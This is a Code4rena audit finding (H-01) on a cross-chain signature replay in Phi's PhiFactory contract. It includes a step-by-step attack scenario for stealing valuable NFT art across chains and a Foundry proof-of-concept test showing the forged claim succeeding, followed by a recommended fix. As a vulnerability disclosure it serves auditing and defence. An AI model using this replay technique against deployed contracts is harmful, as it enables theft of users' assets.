---
tags:
  - lang/solidity
  - sector/nft
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Phi]]"
auditors:
  - "[[McToady]]"
report: "https://code4rena.com/reports/2024-08-phi"
genome:
  - "[[signature-replay]]"
  - "[[direct-drain]]"
  - "[[permit-fork-replay]]"
  - "[[timestamp-dependence]]"
---
# [H-01] Signature replay in `signatureClaim` results in unauthorized claiming of rewards

- id: 41087
- impact: HIGH
- protocol: [[Phi]]
- reporter: McToady (Code4rena)
- source: https://code4rena.com/reports/2024-08-phi

## Summary


The report discusses a bug in the `PhiFactory` contract, which allows for unauthorized and multiple claiming of art rewards. This is due to a faulty signature validation process, which does not check the chain id for which the signature was issued. This means that a signature obtained for one chain can be used to claim rewards on any other chain, resulting in a loss of funds. A proof of concept has been provided and it is recommended to implement a similar approach as in the `Claimable` contract to mitigate this issue. The bug has been confirmed by the Phi team and has been classified as an Invalid Validation bug. 

## Details


Loss of funds due to unauthorized and multiple claiming of art rewards: signature obtained from the Phi signer on one chain can be employed to claim NFT rewards on any other chain.

### Summary

Contract `PhiFactory` includes the function [`signatureClaim`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L327-L346), which is intended for claiming art rewards using a signature obtained from the Phi signing authority. Unfortunately, the signature validation in this function is faulty, as it doesn't validate the chain id for which the signature has been issued:

```solidity
(uint256 expiresIn_, address minter_, address ref_, address verifier_, uint256 artId_,, bytes32 data_) =
    abi.decode(encodeData_, (uint256, address, address, address, uint256, uint256, bytes32));

if (expiresIn_ <= block.timestamp) revert SignatureExpired();
if (_recoverSigner(keccak256(encodeData_), signature_) != phiSignerAddress) revert AddressNotSigned();
```

Notice the fragment `uint256 artId_,, bytes32 data_`: in between of `artId` and `data_` there is the encoded `chainId`, which is ignored.

There is a correct path for signature claims, which goes via `PhiNFT1155` -> [`Claimable::signatureClaim`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/abstract/Claimable.sol#L22-L44), which unpacks the supplied data, but submits to `PhiFactory::signatureClaim` the data with the chain id substituted with `block.chainid`. Unfortunately, `PhiFactory::signatureClaim` can be called directly, thus bypassing this crucial step. As a result, the signature obtained for one chain can be reused for multiple chains. As `PhiFactory` and art contracts on multiple chains are independent, the `artId` referring to some cheap artwork on one chain, may refer on another chain to a very valuable artwork; claiming this artwork without proper authorization leads to direct loss of funds. Here is the scenario:

1. An attacker observes that a valuable art piece exists on chain `A` with `artId`.
2. They find a chain `B` where such `artId` is not yet used, and create a bunch of arts till they reach this `artId`.
3. They correctly claim `artId` on chain `B`.
4. They reuse the obtained signature to claim the art piece with `artId` on chain `A`, thus effectively stealing it.

### Proof of Concept

Drop this test to [Claimable.t.sol](hhttps://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/test/Claimable.t.sol#L172) and execute via `forge test --match-test Kuprum`:

```solidity
    function testKuprum_Claim_with_Signature_Replay() public {
        uint256 artId = 1;
        uint256 tokenId = 1;
        uint256 quantity = 1;

        // The signature is obtained on some other chain
        uint256 otherChainId = 99999;
        assertNotEq(block.chainid, otherChainId);

        // Prepare the signature
        bytes32 claimData = bytes32("1");
        bytes memory signData =
            abi.encode(expiresIn, participant, referrer, verifier, artId, otherChainId, claimData);
        bytes32 digest = ECDSA.toEthSignedMessageHash(keccak256(signData));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
        if (v != 27) s = s | bytes32(uint256(1) << 255);
        bytes memory signature = abi.encodePacked(r, s);

        // Claim from the factory with the signature obtained for another chain
        vm.warp(START_TIME + 1);
        vm.startPrank(participant, participant);
        IPhiFactory.MintArgs memory mintArgs = IPhiFactory.MintArgs(tokenId, quantity, "ART_ID_URL_STRING");
        phiFactory.signatureClaim{ value: phiFactory.getArtMintFee(artId, 1) }(signature, signData, mintArgs);

        // All balances on this chain are updated, despite invalid signature
        assertEq(IERC1155(phiFactory.getArtAddress(artId)).balanceOf(participant, 1), 1, "participant erc1155 balance");
        assertEq(curatorRewardsDistributor.balanceOf(1), CURATE_REWARD, "epoch fee");
        assertEq(verifier.balance, 1 ether, "verify fee");
        vm.startPrank(verifier);
        phiRewards.withdraw(verifier, VERIFY_REWARD);
        assertEq(verifier.balance, 1 ether + VERIFY_REWARD, "verify fee");
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

We recommend to apply in `PhiFactory::signatureClaim` the same approach as in `Claimable::signatureClaim`, i.e., to repack the signature data substituting the `chainId` with `block.chainid`.

### Assessed type

Invalid Validation

**[ZaK3939 (Phi) confirmed via duplicate Issue #59](https://github.com/code-423n4/2024-08-phi-findings/issues/59#event-14166858303)**

***
